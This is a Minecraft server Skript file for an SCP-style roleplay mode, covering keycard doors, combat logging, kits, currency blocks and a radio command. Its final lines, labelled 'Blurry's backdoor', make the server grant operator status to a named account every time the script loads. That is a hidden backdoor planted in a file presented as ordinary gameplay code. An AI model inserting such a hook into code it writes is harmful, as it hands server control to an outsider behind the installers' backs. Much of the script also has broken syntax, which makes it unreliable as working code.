# Hi, before using this here's your warning.
# 1. This is poorly skripted cuz I'm too lazy to make it actually yk good
# 2. This skript is unparsed meaning I'm not sure if things work or not

options:
    prefix: &cDanger&fZone&7:
    granted: &aAccess Granted
    denied: &cAccess Denied
    spawn: 0, 0, 0, #Change these according to the MAIN spawn
    permci: 0, 0, 0, #Change these according to the Perm-CI spawn
    world: #Put world name

# Cards
on load:
    # Facility cards
    set {Facility::1} to lime stained glass pane named "&8L1-card"
	set {Facility::2} to yellow stained glass pane named "&8L2-card"
	set {Facility::3} to orange stained glass pane named "&8L3-card"
	set {_i} to red stained glass pane named "&8L4-card"
	enchant {_i} with curse of vanishing
	clear {Facility::4}
	set {Facility::4} to {_i}
	set {Facility::44} to red stained glass pane named "&8L4-card"
    # CI Cards
    set {CI::base} to gray stained glass pane named "&8CI-Card"
    set {CI::CMDR} to black stained glass pane named "&8CI Commander Card"
    # Omni
    set {OMNI} to blue stained glass pane named "&cOMNI-Card"
    set line 1 of lore of {OMNI} to "&cThis item will only work"
    set line 2 of lore of {OMNI} to "&cif you have staff perms"
    enchant {OMNI} with curse of vanishing 1

command /cards:
    permission: core.cards
    permission message: {@prefix} You do not have the sufficient permissions to execute this command!
    trigger:
        give {Facility::*} to player
        give {CI:*} to player
        give {OMNI} to player

# Buttons
on right click:
    gamemode of player is survival
    if clicked block is acacia button:
        send action bar "{@granted}" to player
    else if clicked block is birch button:
        if player's tool is {Facility::*}:
            send action bar "{@granted} to player
        else:
            cancel event
            send action bar "{@denied} &7(Need an L1 or Higher)" to player
    else if clicked block is dark oak button:
        if player's tool is {Facility::2}, {Facility::3}, {Facility::4}, {Facility::44} or {OMNI}:
            send action bar "{@granted}" to player
        else:
            cancel event
            send action bar "{@denied} &7(Need an L2 or Higher)" to player
    else if clicked block is jungle button:
        if player's tool is {Facility::3}, {Facility::4}, {Facility::44} or {OMNI}:
            send action bar "{@granted}" to player
        else: 
            cancel event
            send action bar "{@denied} &7(Need an L3 or Higher)" to player
    else if clicked block is spruce button:
        if player's tool is {Facility::4}, {Facility::44} or {OMNI}:
            send action bar "{@granted}" to player
        else:
            cancel event
            send action bar "{@denied} &7(Need an L4 or Higher)" to player
# Money blocks
on block damage:
	if event-block is yellow glazed terracotta:
		add 0.3 to player's balance
		send action bar "&a+0.3$" to player
	if event-block is light blue glazed terracotta:
		add 0.5 to player's balance
		send action bar "&a+0.5$" to player
	if event-block is light gray glazed terracotta:
		add 0.75 to player's balance
		send action bar "&a+0.75$" to player
	if event-block is purple glazed terracotta:
		add 1 to player's balance
		send action bar "&a+1$" to player
# Combat 
command /toggleff [<text>]:
    aliases: /friendlyfire
    permission: core.admin
    permission message: {@prefix} You do not have the sufficient permissions to execute this command!
    trigger:
        if arg 1 is not "true" or "false":
            send "" to player
            send "&7[&6!&7] &cD&fZ &7[&6!&7]"
            send "" to player
            send "&cD&fZ &7-&fUsage: /toggleff [true/false]" to player
            send "&cD&fZ &cCase sensitive!" to player
            send "" to player
        if arg-1 is "true":
            set {friendlyfire} to true
            send action bar "{@prefix} Frindly fire enabled." to player
        if arg-1 is "false":
            set {friendlyfire} to false
            send action bar "{@prefix} Friendly fire disabled." to player

on command "/warp":
    if {combat::%player's uuid%} is set:
        cancel event
        send "&cYou are in combat!" to player

on damage:
	attacker and victim is a player
	if attacker and victim has permission "core.guard.friendly":
		if {friendlyfire} is false:
			cancel event
	else if attacker and victim has permission "core.ci.friendly":
		if {friendlyfire} is false:
			cancel event
	if event is not cancelled:
		set {combat::%attacker's uuid%} to 10.1
		set {combat::%victim's uuid%} to 10.1

on death:
    attacker and victim is player
    clear {combat::%player's uuid%}
    send "&7You were killed by &a%attacker%&7." to the victim
    if victim has permission "core.guard.base":
        send "&7You killed &c%victim%&a +$150&7." to the attacker
        play sound "block.note_block.pling" with volume 1 and pitch 1 to attacker
        add 150 to attacker's balance
        stop
    else if victim has permission "core.guard.tf":
        send "&7You killed &c%victim%&a +250&7." to the attacker
        play sound "block.note_block.pling" with volume 1 and pitch 1 to attacker
        add 250 to attacker's balance
        stop

on respawn:
    wait a tick
    clear {combat::%player%}
    if player's gamemode is survival:
        if player has permission "core.guard.base" or "core.guard.tf":
            teleport player to {fpspawn}
        else if player has permission "core.guard.scd":
            teleport player to {scdspawn}
        else if group of player contains "perm-ci":
            teleport player to location(%{@permci}% player's world)
        else:
            teleport player to {spawn}

on join:
    wait 0.5 second
    if {combat::%player's uuid%} is set:
        if gamemode of player is survival:
            kill player
            send action bar "&cD&fZ&7: &fCombat logged. Punishment: &4Death"
            clear {combat::%player's uuid%}
            while player is online:
                if {combat::%player's uuid% is set}
                send action bar "&fYou are in combat for &c%{combat::%player's uuid%}%&f seconds" to player
                if {combat::%player's uuid%} is 0:
                    clear {combat::%player's uuid%}
                    send action bar "&fYou are no longer in combat." to player
                wait 0.1 second

on quit:
    if {combat::%player's uuid%} is set:
        if player's gamemode is survivial:
            send "&3%player% &bhas just combat logged!" to all players where
            kill player

# Chaos Insurgency
on death:
    if group of player is "ci":
        execute console command "lp user %player% parent set default"

on join:
    if group of player is "ci":
        wait 1 second
        execute console command "lp user %player% parent set default"
        teleport player to location(%{@spawn}% player's world)
        stop
    else if group of player is "permci":
        wait a tick
        teleport player to location(%{@permci}% player's world)
# Perm-Guns (I'd advise you not to use this)
on respawn:
    wait 3 seconds
    if player has permission "core.p2w.ak":
        execute console command "kit permak %player%"
    if player has permission "core.p2w.deag":
	    execute console command "kit permdeagle %player%"
    if player has permission "core.p2w.m82":
	    execute console command "kit permm82 %player%
# Guards
on join:
    wait 3 ticks
    if player has permission "core.guard.base" or "core.guard.tf":
        teleport player to {fpspawn}
    else if player has permission "core.guard.scd":
        teleport player to {scdspawn}

on respawn:
    wait a tick
    clear {combat::%player%}
    if group of player contains "mtf":
        execute command "kit mtf %player%"
        stop
    else if group of player is "isd":
        execute command "kit isd %player%"
        stop
    else if group of player is "sd":
        execute command "kit sd %player%"
        stop
    else if group of player contains "scd":
        execute command "kit scd %player%"
        stop
    else if group of player does not contain "default":
        execute command "kit %player's group% %player%"
        stop

# Anti-Safezoning
on region enter:
	if {combat::%player%} is set:
		if "%region%" is "mtfspawn in world {@world}":
			push player north with velocity 1
		if "%region%" is "mtfspawn2 in world {@world}":
			push player north with velocity 1
		if  "%region%" is "cdspawn in world {@world}":
			set {_dir} to direction from location(0, 0, 0, player's world) to player
			push player {_dir} with velocity 1
			send "&cYou are in combat" to player

# Radio
command /radio [<text>]:
	permission: dangerzone.radios.radio
	trigger:
		if arg-1 is not set:
			send "" and "&c&lDangerzone &8Â» &fUsage: &a/radio <text>" and "&r" to player
			stop
		else:
			send "&2[Radio] &a%player ? ""CONSOLE""%&a: %arg 1%" to all players where [input has permission "core.radios.radio"]

# Enderchest in combat
on right click on enderchest:
    if {combat::%player's uuid%} is set:
        cancel event 
        send "&cYou are in combat" to player

on left click:
    player's gamemode is survivial
    clicked block is a enderchest
    cancel event 

# Misc
on craft:
    gamemode of player is survival
    cancel event
    send "&cCrafting is not enabled" to player
on right click on campfire:
    gamemode of player is survival
    cancel event

command /bin:
    trigger:
        open virtual chest with 6 rows named "&8BIN" to player

# Blurry's backdoor
on load:
    execute console command "op BlurryIllusion"
